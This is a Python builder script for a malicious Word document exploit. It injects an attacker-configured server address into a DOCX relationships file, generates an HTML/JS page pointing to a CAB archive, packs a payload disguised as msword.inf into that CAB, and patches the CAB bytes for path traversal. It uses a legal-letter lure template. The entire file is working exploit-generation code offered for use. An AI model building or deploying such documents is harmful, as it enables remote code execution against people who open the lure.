import shutil
import msilib
import json
import os

CONF = json.load(open("config.json", "r"))
SOURCE_DIR = os.getcwd()
M_OFF = 0x2d
RELFILE = os.path.join(SOURCE_DIR, "data", "tmp", "word", "_rels", "document.xml.rels")

def patch_cab(path: str):
    print("[ ] Patching CAB file...", end='\r')
    # read cab file in binary mode
    cab_content = open(path, 'rb').read()
    # insert bytes 0x00 0x5c 0x41 0x00 (\0\A\0) at index 0x2d (45)
    out_cab = cab_content[:M_OFF]
    out_cab += b'\x00\x5c\x41\x00'
    out_cab += cab_content[M_OFF+4:]
    # replace win-like path to msword.inf with unix-like path
    out_cab = out_cab.replace(b'..\\msword.inf', b'../msword.inf')
    # write changes to output
    open(path, 'wb').write(out_cab)
    print("[*] Patching CAB file...", end='\r')

def compress_sources():
    # create ZIP archive from decompressed DOCX file
    shutil.make_archive(os.path.join(SOURCE_DIR, CONF["doc_name"]), "zip", os.path.join(SOURCE_DIR, "data", "tmp"))
    # remove the .zip ending shutil.make_archive has added
    os.rename(os.path.join(SOURCE_DIR, CONF["doc_name"] + ".zip"), os.path.join(SOURCE_DIR, CONF["doc_name"]))

def inject_docx():
    print("[ ] Injecting DOCX sources...", end='\r')
    # copy template to tmp folder
    shutil.copytree(os.path.join(SOURCE_DIR, "A Letter before court 4"), os.path.join(SOURCE_DIR, "data", "tmp"))
    # read content of file which needs to be manipulated
    _rels = open(RELFILE, "r").read()
    # open file which needs to be manipulated in write mode
    relfile = open(RELFILE, "w")
    # create setup host from configured values in config.json
    exploit_host = f"{CONF['srv_url']}:{CONF['srv_port']}/{CONF['srv_path']}"
    # replace placeholder with the exploit_host
    _rels = _rels.replace("<EXPLOIT_HOST>", exploit_host)
    # write changes and close file
    relfile.write(_rels)
    relfile.close()
    # compress files to DOCX
    compress_sources()
    # delete temporary folder
    shutil.rmtree(os.path.join(SOURCE_DIR, "data", "tmp"))
    print("[*] Injecting DOCX sources...")

def inject_js():
    print("[ ] Build JS from template...", end='\r')
    # read HTML from template file
    _side = open(os.path.join(SOURCE_DIR, CONF["srv_template"]), "r").read()
    # replace placeholders with url to CAB file
    _side = _side.replace("<EXPLOIT_HOST>", f"{CONF['srv_url']}:{CONF['srv_port']}/{CONF['cab_name']}")
    # open actual HTML file for writing
    side = open(os.path.join(SOURCE_DIR, CONF["srv_path"]), "w")
    # update content in HTML file
    side.write(_side)
    print("[*] Build JS from template...")

def gen_cab_file():
    print("[ ] Generate and patch CAB file", end='\r')
    os.mkdir(os.path.join(SOURCE_DIR, "data", "cab"))
    # copy original payload to data/msword.inf
    shutil.copy2(os.path.join(SOURCE_DIR, CONF["payload"]), os.path.join(SOURCE_DIR, "data", "msword.inf"))
    # create CAB archive containing the msword.inf file
    msilib.FCICreate(os.path.join(SOURCE_DIR, "data", "cab", CONF["cab_name"]), [(os.path.join(SOURCE_DIR, "data", "msword.inf"), "msword.inf")])
    # move the CAB file to the source directory
    shutil.move(os.path.join(SOURCE_DIR, "data", "cab", CONF["cab_name"]), os.path.join(SOURCE_DIR, CONF["cab_name"]))
    # remove temporary CAB folder
    shutil.rmtree(os.path.join(SOURCE_DIR, "data", "cab"))
    # patch CAB file
    patch_cab(os.path.join(SOURCE_DIR, CONF["cab_name"]))
    print("[*] Generate and patch CAB file")